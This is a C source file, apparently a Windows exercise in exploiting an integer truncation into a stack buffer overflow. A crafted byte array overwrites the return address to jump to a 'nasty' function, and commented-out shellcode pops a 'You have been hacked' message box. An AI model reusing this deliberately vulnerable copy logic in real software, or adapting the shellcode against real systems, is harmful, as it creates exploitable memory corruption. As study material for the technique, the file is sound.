/*
 ============================================================================
 Name        : integerOverflowTest.c
 Author      : 
 Version     :
 Copyright   : Your copyright notice
 Description : Hello World in C, Ansi-style
 ============================================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
typedef void (*MYPROC)(LPTSTR);

//#if 0
char overflow[] =
		"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
		    "\x51\x52\x53\x54\x55\x56"
		     "\xeb\x14\x40\x00";
//#endif
/*
char overflow[] =
		"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
		"\x51\x52\x53\x54\x55\x56"
		"\xae\xfd\x35\x77";
*/
int fun(int i)
{
    unsigned short s;
    char szBuf[8];
    s = i;
    if(s > 8)
    {
        return 0;
    }
    if(i > sizeof(overflow))
    {
        memcpy(szBuf, overflow, sizeof(overflow));
    }
    else
    {
        memcpy(szBuf, overflow, i);
    }
    return 1;
}

void nasty(){
	printf("a little nasty!\n");
}

int main(int argc, char *argv[])
{

    int i, ret;
    if(argc != 2)
    {
        return -1;
    }
    i = atoi(argv[1]);


    ret = fun(i);
    return 0;

/*
	 HINSTANCE LibHandle;
	        MYPROC ProcAdd;
	        LibHandle = LoadLibrary("user32");
	        //获取user32.dll的地址
	        printf("user32 = 0x%x\n", LibHandle);
	        //获取MessageBoxA的地址
	        ProcAdd=(MYPROC)GetProcAddress(LibHandle,"MessageBoxA");
	        printf("MessageBoxA = 0x%x\n", ProcAdd);
	        return 0;
*/
/*
		 HINSTANCE LibHandle;
		        MYPROC ProcAdd;
		        LibHandle = LoadLibrary("kernel32");
		        //获取kernel32.dll的地址
		        printf("kernel32 = 0x%x\n", LibHandle);
		        //获取ExitProcess的地址
		        ProcAdd=(MYPROC)GetProcAddress(LibHandle,"ExitProcess");
		        printf("ExitProcess = 0x%x\n", ProcAdd);
		        return 0;
*/
/*
	    __asm__(
	        sub esp,0x50
	        xor ebx,ebx
	        push ebx           // cut string
	        push 0x20676e69
	        push 0x6e726157    // push "Warning"
	        mov eax,esp
	                push ebx             // cut string
	        push 0x2020292e
	        push 0x592e4a20
	        push 0x79622821
	        push 0x64656b63
	        push 0x6168206e
	        push 0x65656220
	                push 0x65766168
	        push 0x20756f59    // push "You have been hacked!(by J.Y.)"
	        mov ecx,esp

	        push ebx
	        push eax
	        push ecx
	        push ebx
	        mov eax,0x7735fdae
	        call eax           // call MessageBox
	                push ebx
	                mov eax, 0x770e7a18
	                call eax            // call ExitProcess
	    );
	    return 0;
*/
}

